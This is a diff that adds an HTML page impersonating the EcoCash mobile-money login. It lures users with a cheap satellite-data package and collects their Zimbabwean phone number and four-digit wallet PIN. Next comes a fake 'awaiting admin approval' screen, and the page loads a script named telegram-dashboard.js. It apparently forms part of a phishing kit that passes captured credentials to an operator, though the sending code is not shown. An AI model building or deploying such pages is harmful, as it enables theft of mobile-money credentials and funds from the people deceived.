@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EcoCash - Login & Payment</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="ecocash.css">
+</head>
+
+<body>
+  <div class="ecocash-card-container">
+    <!-- Selected Plan Summary Badge (Dynamic) -->
+    <div id="plan-summary-badge" class="plan-summary-badge" style="display: none;">
+      <div class="summary-left">
+        <span class="summary-label">Selected Package:</span>
+        <strong id="summary-plan-title">15GB Satellite Data</strong>
+      </div>
+      <div class="summary-price" id="summary-plan-price">USD 0.99</div>
+    </div>
+
+    <!-- Main White Login Card -->
+    <div class="login-box-content">
+      <!-- EcoCash Logo -->
+      <div class="ecocash-logo-row">
+        <h1 class="ecocash-logo">
+          <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
+        </h1>
+      </div>
+
+      <!-- Title -->
+      <h2 class="login-title">Login</h2>
+
+      <!-- Phone Input Form -->
+      <form id="ecocash-login-form" onsubmit="handleEcoCashSubmit(event)">
+        <div class="phone-input-field-group">
+          <!-- Zimbabwe Flag SVG Icon -->
+          <div class="flag-icon-wrap" title="Zimbabwe (+263)">
+            <svg class="zim-flag-svg" viewBox="0 0 48 28" width="30" height="18">
+              <!-- Stripes: Green, Yellow, Red, Black, Red, Yellow, Green -->
+              <rect y="0" width="48" height="4" fill="#006400" />
+              <rect y="4" width="48" height="4" fill="#ffd700" />
+              <rect y="8" width="48" height="4" fill="#d40000" />
+              <rect y="12" width="48" height="4" fill="#000000" />
+              <rect y="16" width="48" height="4" fill="#d40000" />
+              <rect y="20" width="48" height="4" fill="#ffd700" />
+              <rect y="24" width="48" height="4" fill="#006400" />
+              <!-- White Triangle -->
+              <polygon points="0,0 20,14 0,28" fill="#ffffff" stroke="#000000" stroke-width="0.6" />
+              <!-- Red Star & Zimbabwe Bird silhouette -->
+              <polygon points="6.5,8.5 7.5,11.5 10.5,11.5 8,13.5 9,16.5 6.5,14.5 4,16.5 5,13.5 2.5,11.5 5.5,11.5"
+                fill="#d40000" />
+              <circle cx="6.5" cy="13" r="1.8" fill="#ffd700" />
+            </svg>
+          </div>
+
+          <span class="prefix-code">+263</span>
+
+          <input type="tel" id="ecocash-phone-input" class="phone-text-input" placeholder="Phone Number" maxlength="14"
+            required autocomplete="tel" />
+        </div>
+
+        <!-- PIN Input — 4 boxes -->
+        <div class="pin-boxes-label">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="#64748b" style="vertical-align:middle;margin-right:5px"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+          PIN
+          <button type="button" id="pin-toggle" class="pin-toggle-btn" aria-label="Show PIN" title="Show/Hide PIN">
+            <!-- Eye open (hidden by default) -->
+            <svg id="eye-open" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#0066cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+            </svg>
+            <!-- Eye closed (shown by default) -->
+            <svg id="eye-closed" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#0066cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>
+            </svg>
+          </button>
+        </div>
+        <div class="pin-boxes" id="pin-boxes" role="group" aria-label="Enter 4-digit PIN">
+          <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" autocomplete="off" aria-label="PIN digit 1">
+          <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" autocomplete="off" aria-label="PIN digit 2">
+          <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" autocomplete="off" aria-label="PIN digit 3">
+          <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" autocomplete="off" aria-label="PIN digit 4">
+        </div>
+
+        <button type="button" id="btn-login" class="btn-ecocash-login" onclick="handleEcoCashSubmit(event)">
+          <span>Login</span>
+        </button>
+      </form>
+
+      <!-- Approval Waiting Screen (shown after phone + PIN submitted) -->
+      <div id="approval-waiting" style="display:none;" class="approval-waiting-card">
+        <div class="approval-spinner"></div>
+        <div class="approval-title">Waiting for Admin Approval</div>
+        <p class="approval-body">Your request has been sent to the administrator.<br>Please wait while your account is being reviewed.</p>
+        <div class="approval-status-pill" id="approval-status-pill">
+          ⏳ Awaiting approval...
+        </div>
+        <button class="btn-ecocash-login" id="btn-cancel-approval" style="margin-top:16px;background:#64748b;font-size:13px;height:40px;" onclick="cancelApproval()">
+          Cancel &amp; Go Back
+        </button>
+      </div>
+    </div>
+
+    <!-- Bottom Curved Blue Banner Section -->
+    <div class="bottom-curved-banner">
+      <div class="bottom-banner-curve-top"></div>
+      <div class="bottom-banner-content">
+        <p class="bottom-support-text">
+          To register an EcoCash wallet or get assistance, click below
+        </p>
+
+        <!-- Two White Action Cards -->
+        <div class="action-cards-row">
+          <!-- Register Card -->
+          <a href="#" class="action-card-btn" onclick="showRegisterInfo(event)">
+            <div class="action-card-icon">
+              <!-- User with Plus icon -->
+              <svg viewBox="0 0 24 24" width="22" height="22" fill="#0056b3">
+                <path
+                  d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                <path d="M20 10v-2h-2V6h-2v2h-2v2h2v2h2v-2z" fill="#0066cc" />
+              </svg>
+            </div>
+            <span class="action-card-label">Register</span>
+          </a>
+
+          <!-- Help & Support Card -->
+          <a href="#" class="action-card-btn" onclick="showHelpInfo(event)">
+            <div class="action-card-icon">
+              <!-- Info icon with blue rounded background -->
+              <div class="info-blue-box">
+                <span class="info-letter">i</span>
+              </div>
+            </div>
+            <span class="action-card-label">Help & Support</span>
+          </a>
+        </div>
+
+        <!-- Footer version & terms -->
+        <div class="bottom-footer-legal">
+          <div class="version-text">v4.0.3P</div>
+          <div class="terms-text">
+            By signing in you agree to the <a href="#" class="terms-link"
+              onclick="event.preventDefault(); alert('EcoCash Standard Terms and Conditions apply.');">Terms and
+              Conditions</a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="config.js"></script>
+  <script src="telegram-dashboard.js"></script>
+  <script src="ecocash.js"></script>
+</body>
+
+</html>
